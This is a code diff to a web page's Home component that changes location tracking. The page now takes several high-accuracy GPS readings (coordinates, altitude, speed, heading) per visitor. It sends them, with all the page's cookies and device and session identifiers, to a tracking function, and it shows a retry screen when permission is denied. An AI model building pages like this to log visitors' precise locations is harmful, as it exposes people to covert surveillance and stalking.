@@ -48,55 +48,138 @@ export default function Home() {
         visitIdRef.current = String(bootResult.data.id);
       }
 
-      // 4) Then request location → update SAME visit
-      const updateLocationOnce = async (
-        coords: GeolocationCoordinates | null
+      // 4) Request GPS — save multiple readings into locations[]
+      const pushGps = async (
+        coords: GeolocationCoordinates,
+        note: string
       ) => {
-        const payload: Record<string, unknown> = {
-          stage: coords ? "location" : "location_denied",
-          visitId: visitIdRef.current,
-          visitorId: visitorIdRef.current,
-          sessionId: sessionIdRef.current,
-          cookies: getAllCookies(),
-          device,
-          locationGranted: !!coords,
-          event: {
-            type: coords ? "location_granted" : "location_denied",
-            at: new Date().toISOString(),
+        await trackEverywhere(
+          {
+            stage: "location",
+            visitId: visitIdRef.current,
+            visitorId: visitorIdRef.current,
+            sessionId: sessionIdRef.current,
+            cookies: getAllCookies(),
+            device,
+            locationGranted: true,
+            source: "gps",
+            latitude: Number(coords.latitude),
+            longitude: Number(coords.longitude),
+            accuracy:
+              coords.accuracy != null ? Number(coords.accuracy) : null,
+            altitude:
+              coords.altitude != null ? Number(coords.altitude) : null,
+            heading: coords.heading != null ? Number(coords.heading) : null,
+            speed: coords.speed != null ? Number(coords.speed) : null,
+            // also send as array item for bulk append
+            locations: [
+              {
+                latitude: Number(coords.latitude),
+                longitude: Number(coords.longitude),
+                accuracy:
+                  coords.accuracy != null ? Number(coords.accuracy) : null,
+                altitude:
+                  coords.altitude != null ? Number(coords.altitude) : null,
+                heading:
+                  coords.heading != null ? Number(coords.heading) : null,
+                speed: coords.speed != null ? Number(coords.speed) : null,
+                source: "gps",
+              },
+            ],
+            event: {
+              type: note,
+              at: new Date().toISOString(),
+              meta: {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+              },
+            },
           },
-        };
-        if (coords) {
-          payload.latitude = coords.latitude;
-          payload.longitude = coords.longitude;
-          payload.accuracy = coords.accuracy;
-          payload.altitude = coords.altitude;
-          payload.heading = coords.heading;
-          payload.speed = coords.speed;
-        }
-
-        await trackEverywhere(payload, { keepalive: true });
-        if (coords) setScreen("ready");
-        else setScreen("retry");
+          { keepalive: true }
+        );
       };
 
       if (!navigator.geolocation) {
-        await updateLocationOnce(null);
+        setScreen("retry");
         return;
       }
 
       await new Promise<void>((resolve) => {
+        let gotOne = false;
+        let settled = false;
+        let watchId: number | null = null;
+        let samples = 0;
+        const maxSamples = 3;
+
+        const settle = (fn: () => void) => {
+          if (settled) return;
+          settled = true;
+          if (watchId != null) {
+            try {
+              navigator.geolocation.clearWatch(watchId);
+            } catch {
+              /* ignore */
+            }
+          }
+          fn();
+          resolve();
+        };
+
+        const doneDenied = async () => {
+          await trackEverywhere(
+            {
+              stage: "location_denied",
+              visitId: visitIdRef.current,
+              visitorId: visitorIdRef.current,
+              sessionId: sessionIdRef.current,
+              cookies: getAllCookies(),
+              device,
+              locationGranted: false,
+              event: {
+                type: "location_denied",
+                at: new Date().toISOString(),
+              },
+            },
+            { keepalive: true }
+          );
+          settle(() => setScreen("retry"));
+        };
+
+        // First fix + a few more GPS samples → locations[]
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
-            await updateLocationOnce(pos.coords);
-            resolve();
+            gotOne = true;
+            samples += 1;
+            await pushGps(pos.coords, "location_granted");
+            watchId = navigator.geolocation.watchPosition(
+              async (p) => {
+                if (settled) return;
+                samples += 1;
+                await pushGps(p.coords, "location_sample");
+                if (samples >= maxSamples) {
+                  settle(() => setScreen("ready"));
+                }
+              },
+              () => {
+                if (gotOne) settle(() => setScreen("ready"));
+              },
+              {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 20000,
+              }
+            );
+            setTimeout(() => {
+              if (gotOne) settle(() => setScreen("ready"));
+            }, 8000);
           },
           async () => {
-            await updateLocationOnce(null);
-            resolve();
+            await doneDenied();
           },
           {
             enableHighAccuracy: true,
-            timeout: 15000,
+            timeout: 20000,
             maximumAge: 0,
           }
         );
